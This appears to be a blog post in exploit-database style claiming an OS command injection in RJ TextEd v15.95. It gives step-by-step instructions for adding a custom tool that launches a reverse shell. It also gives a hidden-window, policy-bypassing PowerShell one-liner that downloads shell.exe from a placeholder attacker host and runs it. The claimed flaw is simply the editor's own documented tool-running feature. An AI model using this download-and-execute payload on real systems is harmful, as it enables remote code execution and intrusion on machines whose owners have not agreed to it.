---
layout: post
title: RJ TextEd v15.95 - OS Command Injection
date: 2023-09-17
category: exploit
---

# Exploit Title: RJ TextEd v15.95 - OS Command Injection
# Discovered by: Ahmet Ümit BAYRAM
# Discovered Date: 17.09.2023
# Vendor Homepage: https://www.rj-texted.se
# Software Link: https://www.fosshub.com/RJ-TextEd.html?dwl=rj-install_x86-15.95.exe
# Tested Version: v15.95 (latest)
# Tested on: Windows 2019 Server 64bit

### Steps to Reproduce

1. Open RJ TextEd.
2. Click on **Tools** from the top menu.
3. Select **Configure tools**.
4. Click on **Add** to create a new tool.
5. Check the **Run as DOS Command and capture output** box.
6. In the **Menu text** box, type "shell".
7. In the **Command** box, enter your reverse shell command.
8. Click **OK**, then **Apply**, and **OK** again.
9. From the top menu, go to **Tools** and select **shell**.
10. The reverse shell should now be active, connecting back to your listener.

### Example of Reverse Shell Command

To set up a reverse shell command, you can use the following in the **Command** box:

```batch
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "Invoke-WebRequest -Uri http://attacker_ip:port -OutFile %TEMP%\shell.exe; Start-Process %TEMP%\shell.exe"
